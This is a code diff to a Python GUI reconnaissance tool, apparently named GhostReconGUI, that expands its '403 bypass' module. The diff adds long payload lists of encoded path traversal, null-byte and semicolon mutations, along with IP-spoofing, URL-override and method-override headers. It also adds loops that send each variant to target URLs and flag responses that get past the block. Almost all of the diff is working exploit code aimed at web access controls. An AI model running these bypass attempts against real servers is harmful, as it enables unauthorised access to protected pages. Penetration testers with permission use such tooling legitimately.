@@ -2829,6 +2829,10 @@ class GhostReconGUI:
         btn = ttk.Button(tab, text="Try bypass techniques", command=self.start_bypass)
         btn.grid(row=3, column=0, sticky="w", padx=4, pady=4)
         self.run_buttons.append(btn)
+        self.bypass_thorough = tk.BooleanVar(value=False)
+        ttk.Checkbutton(
+            tab, text="Thorough (full header matrix — many more requests/URL)",
+            variable=self.bypass_thorough).grid(row=3, column=1, sticky="w", padx=4)
         self.outputs["bypass"] = self._make_output(tab)
 
     def _load_forbidden_dirs(self):
@@ -3286,16 +3290,42 @@ class GhostReconGUI:
 
     # ---- 403 bypass ---- #
     BYPASS_PATHS = [
-        "{p}/", "{p}/.", "{p}//", "{p}/./", "{p}/%2e/", "{p}%20", "{p}%09",
-        "{p}?", "{p}#", "{p}/..;/", "{p};/", "{p}.json", "{p}.html", "{p}/~",
-        "/%2e{p}", "{p}..%2f", "{p}%2e%2e%2f",
+        # trailing / dot / slash tricks
+        "{p}/", "{p}/.", "{p}//", "{p}/./", "{p}/%2e/", "{p}/%2f/",
+        "{p}/.randomstring", "{p}/*", "{p}/?", "{p}/..;/", "{p};/", "{p};",
+        # whitespace & null/newline
+        "{p}%20", "{p}%09", "{p}%00", "{p}%0a", "{p}%0d", "{p}%2500",
+        # query / fragment truncation
+        "{p}?", "{p}#", "{p}%23", "{p}?x=1",
+        # extension / semicolon tricks (Spring, IIS, ...)
+        "{p}.json", "{p}.html", "{p}.css", "{p}.js", "{p};.css", "{p};.json",
+        "{p}%2e.json", "{p}/~",
+        # traversal + single/double url-encoding
+        "{p}..%2f", "{p}%2e%2e%2f", "{p}%2e%2e/", "{p}..%252f", "{p}%252e%252e%252f",
+        "{p}/..%00/", "{p}/..;/..;/",
+        # leading tricks (prepend to path)
+        "/%2e{p}", "/%2f{p}", "//{p}", "/.{p}", "/{p}/..",
     ]
-    BYPASS_HEADERS = [
-        ("X-Forwarded-For", "127.0.0.1"), ("X-Forwarded-Host", "127.0.0.1"),
-        ("X-Originating-IP", "127.0.0.1"), ("X-Remote-IP", "127.0.0.1"),
-        ("X-Client-IP", "127.0.0.1"), ("X-Host", "127.0.0.1"),
-        ("X-Original-URL", "{path}"), ("X-Rewrite-URL", "{path}"),
-        ("X-Custom-IP-Authorization", "127.0.0.1"),
+    # IP-spoof headers: every name is tried with every value below.
+    BYPASS_IP_HEADERS = [
+        "X-Forwarded-For", "X-Forwarded-Host", "X-Originating-IP",
+        "X-Remote-IP", "X-Remote-Addr", "X-Client-IP", "X-Host",
+        "X-Real-IP", "X-ProxyUser-Ip", "True-Client-IP",
+        "Cluster-Client-IP", "X-Forwarded-Server", "Forwarded-For",
+        "X-Custom-IP-Authorization",
+    ]
+    BYPASS_IP_VALUES = [
+        "127.0.0.1", "localhost", "0.0.0.0", "127.0.0.1:80", "127.0.0.1:443",
+        "0177.0.0.1", "2130706433", "::1",
+    ]
+    # path-override headers: value is set to the forbidden request path.
+    BYPASS_PATH_HEADERS = [
+        "X-Original-URL", "X-Rewrite-URL", "X-Override-URL",
+        "X-Originating-URL", "X-Forwarded-Path", "Request-Uri", "Base-Url",
+    ]
+    # method-override headers: value is set to a benign method.
+    BYPASS_METHOD_HEADERS = [
+        "X-HTTP-Method-Override", "X-HTTP-Method", "X-Method-Override",
     ]
 
     def start_bypass(self):
@@ -3312,6 +3342,19 @@ class GhostReconGUI:
             return
         outdir = self.state["outdir"] or self._new_outdir(
             re.sub(r'^https?://', '', urls[0]).split("/")[0])
+        thorough = self.bypass_thorough.get()
+        # Fast mode trims the IP-header matrix and method-override verbs;
+        # thorough mode fires the full lists.
+        if thorough:
+            ip_headers, ip_values = self.BYPASS_IP_HEADERS, self.BYPASS_IP_VALUES
+            mo_verbs = ("GET", "POST", "TRACE")
+        else:
+            ip_headers = ["X-Forwarded-For", "X-Forwarded-Host", "X-Real-IP",
+                          "X-Client-IP", "X-Originating-IP", "X-Host",
+                          "X-Custom-IP-Authorization"]
+            ip_values = ["127.0.0.1", "localhost", "::1"]
+            mo_verbs = ("GET",)
+        self.append(w, f"[*] Mode: {'thorough' if thorough else 'fast'}\n")
         results = []
         for url in urls:
             if self.stop_requested:
@@ -3321,32 +3364,57 @@ class GhostReconGUI:
             orig_code, orig_size = self._curl_probe(url)
             self.append(w, f"\n=== {url}  (baseline [{orig_code}] {orig_size} B) ===\n")
             wins = []
+
+            def _try(desc, probe_url, **kw):
+                if self.stop_requested:
+                    return
+                code, size = self._curl_probe(probe_url, **kw)
+                if code and code not in ("403", "401", orig_code) and code[0] in "23":
+                    wins.append((desc, code, size))
+                    self.append(w, f"  [BYPASS] {desc}  -> [{code}] {size} B\n")
+
             # path mutations
             for tmpl in self.BYPASS_PATHS:
                 if self.stop_requested:
                     break
-                mutated = base + tmpl.format(p=path)
-                code, size = self._curl_probe(mutated)
-                if code and code not in ("403", "401", orig_code) and code[0] in "23":
-                    wins.append((f"path {tmpl.format(p=path)}", code, size))
-                    self.append(w, f"  [BYPASS] {mutated}  -> [{code}] {size} B\n")
-            # header tricks
-            for name, val in self.BYPASS_HEADERS:
+                mut = tmpl.format(p=path)
+                _try(f"path {mut}", base + mut)
+            # case mutation of the last path segment (/Admin, /ADMIN)
+            seg = path.rstrip("/").rsplit("/", 1)
+            if len(seg) == 2 and seg[1]:
+                head, last = seg[0], seg[1]
+                for variant in {last.upper(), last.capitalize(), last.swapcase()}:
+                    if self.stop_requested:
+                        break
+                    if variant != last:
+                        cm = f"{head}/{variant}"
+                        _try(f"case {cm}", base + cm)
+            # IP-spoof headers (name x value)
+            for name in ip_headers:
                 if self.stop_requested:
                     break
-                hv = val.format(path=path)
-                code, size = self._curl_probe(url, extra_headers=[f"{name}: {hv}"])
-                if code and code not in ("403", "401", orig_code) and code[0] in "23":
-                    wins.append((f"header {name}: {hv}", code, size))
-                    self.append(w, f"  [BYPASS] {name}: {hv}  -> [{code}] {size} B\n")
+                for val in ip_values:
+                    if self.stop_requested:
+                        break
+                    _try(f"header {name}: {val}", url, extra_headers=[f"{name}: {val}"])
+            # path-override headers (value = forbidden path)
+            for name in self.BYPASS_PATH_HEADERS:
+                if self.stop_requested:
+                    break
+                _try(f"header {name}: {path}", url, extra_headers=[f"{name}: {path}"])
+            # method-override headers (keep GET verb, override via header)
+            for name in self.BYPASS_METHOD_HEADERS:
+                if self.stop_requested:
+                    break
+                for mv in mo_verbs:
+                    if self.stop_requested:
+                        break
+                    _try(f"header {name}: {mv}", url, extra_headers=[f"{name}: {mv}"])
             # method change
-            for method in ("POST", "PUT", "TRACE", "OPTIONS"):
+            for method in ("POST", "PUT", "PATCH", "TRACE", "OPTIONS", "HEAD"):
                 if self.stop_requested:
                     break
-                code, size = self._curl_probe(url, method=method)
-                if code and code not in ("403", "401", orig_code) and code[0] in "23":
-                    wins.append((f"method {method}", code, size))
-                    self.append(w, f"  [BYPASS] method {method}  -> [{code}] {size} B\n")
+                _try(f"method {method}", url, method=method)
             if not wins:
                 self.append(w, "  no bypass found.\n")
             results.append((url, orig_code, wins))
